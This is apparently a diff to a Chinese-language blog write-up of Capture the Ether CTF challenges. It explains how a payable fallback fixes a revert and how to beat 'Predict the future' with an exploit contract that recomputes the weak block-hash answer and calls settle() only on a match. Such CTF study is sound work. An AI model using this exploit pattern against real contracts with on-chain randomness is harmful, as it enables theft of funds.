@@ -195,8 +195,10 @@
 
        **非常重要！！！**
      
-      就是因为没有写支持`payable`的`fallback`函数导致一直报`transaction revert error`。
+      就是因为没有写支持`payable`的`fallback`函数导致一直报
 
+     > `Gas estimation failed:execution reverted`。
+     
      原因是`guess(uint8)`函数中有一条`msg.sender.transfer(2 ether);`会产生带有以太的回调。如果回调函数（即fallback函数）没有`payable`关键字，那就会报错。
      
      ![](https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png)
@@ -206,3 +208,114 @@
        这个函数没有使用`payable`关键字，但是内部却使用了.value()。换言之，`payable`关键字的含义是“**调用该函数时**是否可以携带以太”。
   
        该函数调用别的函数时，只要别的函数有`payable`关键字就可以。
+
+### [Predict the future](https://capturetheether.com/challenges/lotteries/predict-the-future/)
+
+* 题目
+
+```
+pragma solidity ^0.4.21;
+
+contract PredictTheFutureChallenge {
+    address guesser;
+    uint8 guess;
+    uint256 settlementBlockNumber;
+
+    function PredictTheFutureChallenge() public payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(uint8 n) public payable {
+        require(guesser == 0);
+        require(msg.value == 1 ether);
+
+        guesser = msg.sender;
+        guess = n;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser);
+        require(block.number > settlementBlockNumber);
+
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+        guesser = 0;
+        if (guess == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+```
+
+
+
+* Write-Up
+
+  题目含义是answer的设置必须在`keccak256`的区块之前就进行。
+
+  一开始的思路是能否确定`settle()`函数在哪个区块被执行，然后根据这个answer先计算。发现根本不可能确定具体在哪个区块被执行，遂放弃这个思路。
+
+  重点是在于answer模了10，那么这个answer的可取值范围就很小了。开始考虑爆破。
+
+  题目最后验证的是合约没有以太。如果我们执行了一次`settle()`又失败了，那么由于 `guesser= 0;`，guesser被重置，又要执行一次`lockInGuess(uint8 n)`，就又增加了1 ether。那么最后即使answer猜中了，验证也不会通过。所以我们必须执行仅仅一次`settle()`就成功。实现一个合约，在调用`settle()`前先判断一下answer是否猜中即可。
+
+  攻击合约的代码如下：
+
+```
+pragma solidity ^0.4.21;
+
+contract PredictTheFutureChallenge {
+...
+}
+
+contract exploit{
+    uint8 guess;
+    address addr_predContract;
+
+    function callLockInGuess(uint8 n,address addr) payable {
+        guess = n;
+        addr_predContract = addr;
+        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);
+        predContract.lockInGuess.value(1 ether)(guess);
+    }
+
+    function attacker(){
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+        require(answer == guess);
+
+        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);
+        predContract.settle();
+    }
+
+    function withdraw() payable{
+        msg.sender.transfer(this.balance);
+    }
+
+    function () payable {
+
+    }
+}
+```
+
+执行流程：
+
+1. 首先执行 `callLockInGuess(uint8 n,address addr)`
+
+   n随便填一个0-9的数，addr是挑战的地址。
+
+2. 多点几次`attacker()`，不管警告。多半会返回transaction fail，直到transaction success为止。当然也可以写个脚本发送请求，但是由于爆破的范围很小，手动点几下基本都可以碰撞成功。
+
+注意：在remix上执行的时候，一般情况都会出现`revert error`
+
+> `Gas estimation failed:execution reverted`。
+
+也可能没有错误提示，直接可以执行。
+
+不管有没有出现错误提示，直接执行即可。出现错误提示仅仅意味着，在以太坊节点模拟执行的时候会出错，这是因为根据模拟执行的最新区块号算出的answer不正确。不出现错误也仅仅意味着根据模拟执行的最新区块号算出的answer正确。只有根据实际执行的最新区块号算出的answer正确才行，所以直接一直执行就可以了。
+
